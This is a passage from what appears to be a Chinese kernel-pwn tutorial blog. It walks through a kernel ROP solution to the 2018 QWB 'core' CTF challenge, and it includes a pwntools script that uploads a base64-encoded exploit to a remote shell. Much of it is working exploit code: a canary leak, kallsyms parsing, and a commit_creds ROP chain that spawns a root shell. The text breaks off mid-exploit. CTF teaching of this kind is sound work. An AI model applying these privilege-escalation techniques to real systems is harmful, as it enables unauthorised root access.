alt="image.png" style="zoom:67%;" /></a></p><p>a common technique to exploit heap overflows with freelist pointer randomisation enabled is to</p><ol><li>Exhaust the cache by allocating objects of the right size to fill in all partial slabs and start allocating new slabs.</li><li>Start filling in new slabs with target objects.</li><li>Free one target object and allocate the vulnerable object.</li><li>Perform the overflow and check which target object was modified.</li></ol><h3 id="三-其他机制"><a href="#三-其他机制" class="headerlink" title="三. 其他机制"></a>三. 其他机制</h3><p><a href="https://samsung.github.io/kspp-study/">https://samsung.github.io/kspp-study/</a> </p><h1 id="绪论-kernel-pwn-tricks"><a href="#绪论-kernel-pwn-tricks" class="headerlink" title="绪论-kernel pwn tricks"></a>绪论-kernel pwn tricks</h1><h2 id="新东西"><a href="#新东西" class="headerlink" title="新东西"></a>新东西</h2><ul><li>qemu的append参数是给内核提供命令行参数用的, 其中<a href="https://www.kernel.org/doc/Documentation/admin-guide/kernel-parameters.txt">loglevel</a>调到6 7打印大部分信息. 链接其余部分是另外的参数, 可以查阅. </li><li></li></ul><h2 id="文件远程传输方式"><a href="#文件远程传输方式" class="headerlink" title="文件远程传输方式"></a>文件远程传输方式</h2><p>通常情况下，在CTF中一个用作 exploit 的静态编译的可执行文件的体积通常可以达到数百KB甚至几M往上，我们没法很方便地将其直接上传到服务器</p><p>目前来说比较通用的办法便是将 exploit 进行 base64 编码后传输，可参考笔者所给出的如下脚本：</p><blockquote><p>笔者优化后的打远程用的脚本. (出题也用114514的屑)</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./exp&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    exp = base64.b64encode(f.read())<br><br>p = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">114514</span>)<br><span class="hljs-comment">#p = process(&#x27;./run.sh&#x27;)</span><br>try_count = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p.sendline()<br>    p.recvuntil(<span class="hljs-string">&quot;/ $&quot;</span>)<br><br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(exp), <span class="hljs-number">0x200</span>):<br>        p.sendline(<span class="hljs-string">&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="hljs-number">0x200</span>].decode() + <span class="hljs-string">&quot;\&quot; &gt;&gt; /tmp/b64_exp&quot;</span>)<br>        count += <span class="hljs-number">1</span><br>        log.info(<span class="hljs-string">&quot;count: &quot;</span> + <span class="hljs-built_in">str</span>(count))<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(count):<br>        p.recvuntil(<span class="hljs-string">&quot;/ $&quot;</span>)<br><br>    p.sendline(<span class="hljs-string">&quot;cat /tmp/b64_exp | base64 -d &gt; /tmp/exploit&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;chmod +x /tmp/exploit&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;/tmp/exploit &quot;</span>)<br>    <span class="hljs-keyword">break</span><br><br>p.interactive()<br></code></pre></div></td></tr></table></figure><blockquote><p>笔者早期写的打远程用的脚本</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs PYTHON">既然是早期那就不要管了<br></code></pre></div></td></tr></table></figure><p>相比起常规的 pwn 题，kernel pwn 打远程会是一个比较漫长的过程，因为大部分的时间都会花在这个文件传输上</p><p>对于部分不需要一些额外功能（如userfaultfd）的题目可以使用 musl-C 库来大幅降低可执行文件的大小</p><p>对于时间比较充足的题目笔者推荐使用纯汇编来编写exp（笑）</p><blockquote><p>若是运气不大好，那么你可能会需要从头来过…</p><p><a href="https://i.loli.net/2021/07/21/VI1wAplsh2W5UYg.png"><img src="https://s2.loli.net/2023/02/06/hY2gy8TCUmIBQOZ.png" alt="image.png" style="zoom:25%;" /></a></p></blockquote><h2 id="常用数据-amp-函数集合"><a href="#常用数据-amp-函数集合" class="headerlink" title="*常用数据 &amp; 函数集合"></a>*<em>常用数据 &amp; 函数集合</em></h2><p>笔者将 kernel pwn 中常用的一些数据、函数等等封装在一个头文件 <a href="../../files/kernelpwn.h">kernelpwn.h</a> 中，封装好了一些如 userfaultfd、keyctl、msg_msg 等的常用物</p><p>这里需要注意的是 musl 库并没有 userfaultfd 的 wrapper，所以笔者对于该头文件中的 userfaultfd 相关代码进行了 ifndef，若是你想要使用 musl-gcc 编译 exp 则可以在包含该头文件之前 <code>#define MUSL_COOMPILE</code>，这样就不会把 userfaultfd 的代码放进去了：)</p><h1 id="Kernel-ROP-basic"><a href="#Kernel-ROP-basic" class="headerlink" title="Kernel ROP - basic"></a>Kernel ROP - basic</h1><p>ROP即<code>返回导向编程</code>（Return-oriented programming），应当是大家比较熟悉的一种攻击方式——通过复用代码片段的方式控制程序执行流</p><p>✳ <strong>内核态的 ROP 与用户态的 ROP 一般无二，只不过利用的 gadget 变成了内核中的 gadget，所需要构造执行的 ropchain 由</strong><code>system(&quot;/bin/sh&quot;)</code><strong>变为了</strong><code>commit_creds(prepare_kernel_cred(NULL))</code> </p><p>当成功执行 <code>commit_creds(prepare_kernel_cred(NULL))</code> 之后，当前线程的 cred 结构体便变为 init 进程的 cred 的拷贝，我们也就获得了 root 权限，此时在用户态起一个 shell 便能获得 root shell</p><h2 id="状态保存"><a href="#状态保存" class="headerlink" title="状态保存"></a>状态保存</h2><p>通常情况下，我们的exploit需要进入到内核当中完成提权，而我们最终仍然需要<strong>着陆回用户态</strong>以获得一个root权限的shell，因此在我们的exploit进入内核态之前我们需要<strong>手动模拟用户态进入内核态的准备工作</strong>——<strong>保存各寄存器的值到内核栈上</strong>，以便于后续着陆回用户态</p><p>通常情况下使用如下函数保存各寄存器值到我们自己定义的变量中，以便于构造 rop 链：</p><blockquote><p>算是一个通用的pwn板子</p><p>方便起见，使用了内联汇编，编译时需要指定参数：<code>-masm=intel</code></p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="返回用户态"><a href="#返回用户态" class="headerlink" title="返回用户态"></a>返回用户态</h2><p>在<a href="https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I/#IV-%E5%86%85%E6%A0%B8%E6%80%81-%E2%80%94-gt-%E7%94%A8%E6%88%B7%E6%80%81"> 这篇博客 </a>当中笔者简要叙述了内核态返回用户态的过程：</p><ul><li><code>swapgs</code>指令恢复用户态GS寄存器</li><li><code>sysretq</code>或者<code>iretq</code>恢复到用户空间</li></ul><p>那么我们只需要在内核中找到相应的gadget并执行<code>swapgs;iretq</code>就可以成功着陆回用户态</p><p>通常来说，我们应当构造如下rop链以返回用户态并获得一个shell：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs AWK">swapgs<br>iretq<br>user_shell_addr<br>user_cs<br>user_eflags <span class="hljs-regexp">//</span><span class="hljs-number">64</span>bit user_rflags<br>user_sp<br>user_ss<br></code></pre></div></td></tr></table></figure><h4 id="接下来是swapgs的科普"><a href="#接下来是swapgs的科普" class="headerlink" title="接下来是swapgs的科普:"></a>接下来是swapgs的科普:</h4><ul><li>结合pwn.college中kernel部分时的查找, 多了几个概念: <a href="https://wiki.osdev.org/Model_Specific_Registers">MSR</a>(Model Specific Registers), <a href="https://wiki.osdev.org/SWAPGS">swapgs的超详细doc</a> |<br><a href="https://akkadia.org/drepper/tls.pdf">ELF Handling For Thread-Local Storage</a> | </li><li>(P2873 in Intel manual) one kind of MSR: Instruction-specific support (for example: SYSENTER, SYSEXIT, <strong><code>SWAPGS</code></strong>, etc.).<br>and P1866 fro swapgs instruction: <code>SWAPGS</code> exchanges the current GS base register value with <strong>the value contained in MSR</strong> address C0000102H(IA32_KERNEL_GS_BASE)</li><li>To acquire the kernel space stack <strong>after <code>swapgs</code></strong>, in entry_SYSCALL_64:<br><code>mov rsp, PER_CPU_VAR(cpu_current_top_of_stack)</code>,<br>expanding to <code>mov rsp, %gs:cpu_current_top_of_stack</code>,<br>GS register stores the base address for per-cpu data area. </li><li>由上面来个总结:  kernel stores the address of the <strong>per-CPU structure</strong> in MSR. 在内核与用户之间切换需使用swapgs交换gs base. </li></ul><blockquote><p>内核ROP和用户态的ROP本质上没有太大区别，细节便不在此赘叙了</p><blockquote><p><del>什么？你说你⑧会 ROP ？那你看个🔨kernel pwn</del> </p><p>👴悟🌶！**带学的带手子pwner在VNCTF2021告诉👴 ROP 事一个寄存器！</p></blockquote></blockquote><h2 id="例题：强网杯2018-core"><a href="#例题：强网杯2018-core" class="headerlink" title="例题：强网杯2018 - core"></a>例题：强网杯2018 - core</h2><blockquote><p>依然是十分经典的kernel pwn入门题</p><p><a href="https://arttnba3.cn/download/qwb2018/pwn/core.7z">点击下载-core.7z</a></p></blockquote><p>首先查看启动脚本<code>start.sh</code>：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL">qemu-system-x86_64 \<br>-m 128M \<br>-kernel ./bzImage \<br>-initrd  ./core.cpio \<br>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \<br>-s  \<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \<br>-nographic  \<br></code></pre></div></td></tr></table></figure><ul><li>开启了KASLR保护</li></ul><p>解压文件系统，查看<code>init</code>文件：</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SH"><span class="hljs-meta">#!/bin/sh</span><br>mount -t proc proc /proc<br>mount -t sysfs sysfs /sys<br>mount -t devtmpfs none /dev<br>/sbin/mdev -s<br>mkdir -p /dev/pts<br>mount -vt devpts -o gid=4,mode=620 none /dev/pts<br>chmod 666 /dev/ptmx<br>cat /proc/kallsyms &gt; /tmp/kallsyms<br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict<br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict<br>ifconfig eth0 up<br>udhcpc -i eth0<br>ifconfig eth0 10.0.2.15 netmask 255.255.255.0<br>route add default gw 10.0.2.2 <br>insmod /core.ko<br><br>poweroff -d 120 -f &amp;<br>setsid /bin/cttyhack setuidgid 1000 /bin/sh<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;sh end!\n&#x27;</span><br>umount /proc<br>umount /sys<br><br>poweroff -d 0  -f<br></code></pre></div></td></tr></table></figure><ul><li>开始时内核符号表被复制了一份到<code>/tmp/kalsyms</code>中，利用这个我们可以获得内核中所有函数的地址</li><li>不出意外的话<code>core.ko</code>就是存在漏洞的内核模块</li><li>改变权限前设置了定时关机，调试的时候可以把这个语句先删掉</li></ul><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>惯例的<code>checksec</code>一下，开了NX和canary</p><p><a href="https://i.loli.net/2021/03/04/Nrpe675FRtBP4ju.png"><img src="https://s2.loli.net/2023/02/06/6FV2UZpifJbKhsA.png" alt="image.png" style="zoom:50%;" /></a></p><p>拖入IDA进行分析，符号表没抠，很开心（</p><p>初始化函数中创建了一个进程节点文件<code>/proc/core</code>，这也是我们后续与内核模块间通信的媒介</p><p><a href="https://i.loli.net/2021/03/04/zocOw75hPrBIZkH.png"><img src="https://s2.loli.net/2023/02/06/vlrcMqys4onAY6P.png" alt="image.png" style="zoom:50%;" /></a></p><p>简单分析自定义的fop结构体<code>core_fops</code>，发现只自定义了三个回调函数</p><p><a href="https://i.loli.net/2021/03/04/JHyemlLTK5G34E2.png"><img src="https://s2.loli.net/2023/02/06/n5NpsRvMrbTLYGA.png" alt="image.png" style="zoom:67%;" /></a></p><p><a href="https://i.loli.net/2021/03/04/TvhVpN86dmfzHoW.png"><img src="https://s2.loli.net/2023/02/06/CofcN7rwIV3liMT.png" alt="image.png" style="zoom:67%;" /></a></p><p><a href="https://i.loli.net/2021/03/04/lDBmUK5fia3bnHL.png"><img src="https://s2.loli.net/2023/02/06/PHTrVMSWN1LA9g8.png" alt="image.png" style="zoom:67%;" /></a></p><p>其中<code>core_release</code>仅为打印功能，就不在此放出了</p><p>而<code>core_write</code>的功能主要是允许用户向bss段上写入最多<code>0x800</code>字节的内容</p><p><a href="https://i.loli.net/2021/03/08/bHKGQyTV7xMB5jS.png"><img src="https://s2.loli.net/2023/02/06/nCy7615itA4UwSl.png" alt="image.png" style="zoom:67%;" /></a></p><p>在<code>core_ioctl</code>中允许我们调用<code>core_read</code>和<code>core_copy_func</code>这两个函数，以及设置全局变量<code>off</code>的值</p><p><a href="https://i.loli.net/2021/03/08/faCDRKvMSN64eux.png"><img src="https://s2.loli.net/2023/02/06/BMmz5Qt7IPDGKxy.png" alt="image.png" style="zoom:67%;" /></a></p><p>在<code>core_read</code>函数中允许我们从栈上读取数据，由于<code>off</code>变量的值可以由我们控制，故我们可以利用该函数泄露栈上数据，包括<code>canary</code></p><p><a href="https://i.loli.net/2021/03/08/5ITzXBM3gJ2YEch.png"><img src="https://s2.loli.net/2023/02/06/1A9XDyYGW43wm5p.png" alt="image.png" style="zoom: 67%;" /></a></p><h3 id="漏洞利用：Kernel-ROP"><a href="#漏洞利用：Kernel-ROP" class="headerlink" title="漏洞利用：Kernel ROP"></a>漏洞利用：Kernel ROP</h3><p>在<code>core_copy_func</code>中将会拷贝bss段上内容到栈上，由于其拷贝时使用低16字节作为判断长度，若是我们传入一个恰当的负数，便能拷贝最多0xffff字节的数据到栈上</p><p>故<strong>存在栈溢出，且溢出数据可控</strong></p><p><a href="https://i.loli.net/2021/03/08/2RYiWgwhFbpq7VC.png"><img src="https://s2.loli.net/2023/02/06/Xy5adbUMipgVwu7.png" alt="image.png"></a></p><p>那么我们便能够利用栈溢出在栈上构造ROP chain以提权</p><p>而canary的值可以通过ioctl提供的功能以泄露，此前内核符号表又已经被拷贝到了<code>/tmp/kallsyms</code>下，我们便可以从中读取各个内核符号的地址</p><p>只要我们能够在内核空间执行<code>commit_cred(prepare_kernel_cred(NULL))</code>，那么就能够将进程的权限提升到<code>root</code></p><p>至于gadget可以直接使用ROPgadget或者ropper对着vmlinux镜像跑一轮，这里便不再赘叙</p><blockquote><p>不明原因，笔者的ROPgadget没法找到<code>iretq</code>，只好使用 pwntools 来搜</p><p><a href="https://s2.loli.net/2022/05/18/cSokGuy3fHxOKhm.png"><img src="https://s2.loli.net/2022/05/18/cSokGuy3fHxOKhm.png" alt="image.png"></a></p></blockquote><p>调试的时候我们可以先把kaslr关掉，获取没有偏移的函数地址，后续再通过该值计算偏移</p><p><a href="https://i.loli.net/2021/03/09/qcQBySIFpu9X1Hl.png"><img src="https://s2.loli.net/2023/02/06/YwekX3SKd25ORF1.png" alt="image.png"></a></p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p>我们这里选择执行<code>commit_creds(prepare_kernel_cred(NULL))</code>以提权</p><p>由于是内核态的rop，故我们需要手动返回用户态执行<code>/bin/sh</code>，这里我们需要模拟由用户态进入内核态再返回用户态的过程</p><p>构造exp如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDI_RET 0xffffffff81000b2f</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDX_RET 0xffffffff810a0f49</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RCX_RET 0xffffffff81021e53</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWAPGS_POPFQ_RET 0xffffffff81a012da</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>  IRETQ 0xffffffff81050ac2</span><br><br><span class="hljs-keyword">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">coreRead</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889B</span>, buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setOffValue</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">size_t</span> off)</span></span><br><span class="hljs-function"></span>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889C</span>, off);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">coreCopyFunc</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">size_t</span> nbytes)</span></span><br><span class="hljs-function"></span>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889A</span>, nbytes);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> ** argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br>    saveStatus();<br><br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the file: /proc/core !\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//get the addr</span><br>    FILE* sym_table_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(sym_table_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x50</span>], type[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-keyword">size_t</span> addr;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table_fd, <span class="hljs-string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            commit_creds = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            prepare_kernel_cred = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">size_t</span> offset = commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;<br><br>    <span class="hljs-comment">// get the canary</span><br>    <span class="hljs-keyword">size_t</span> canary;<br>    setOffValue(fd, <span class="hljs-number">64</span>);<br>    coreRead(fd, buf);<br>    canary = ((<span class="hljs-keyword">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-comment">//construct the ropchain</span><br>    <span class="hljs-keyword">size_t</span> rop_chain[<span class="hljs-number">0x100</span>], i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(; i &lt; <span class="hljs-number">10</span>;i++)<br>        rop_chain[i] = canary;<br>    rop_chain[i++] = POP_RDI_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0</span>;<br>    rop_chain[i++] = prepare_kernel_cred;<br>    rop_chain[i++] = POP_RDX_RET + offset;<br>    rop_chain[i++] = POP_RCX_RET + offset; <span class="hljs-comment">// just to clear the useless stack data</span><br>    rop_chain[i++] = MOV_RDI_RAX_CALL_RDX + offset;<br>    rop_chain[i++] = commit_creds;<br>    rop_chain[i++] = SWAPGS_POPFQ_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0</span>;<br>    rop_chain[i++] = IRETQ + offset;<br>    rop_chain[i++] = (<span class="hljs-keyword">size_t</span>)getRootShell;<br>    rop_chain[i++] = user_cs;<br>    rop_chain[i++] = user_rflags;<br>    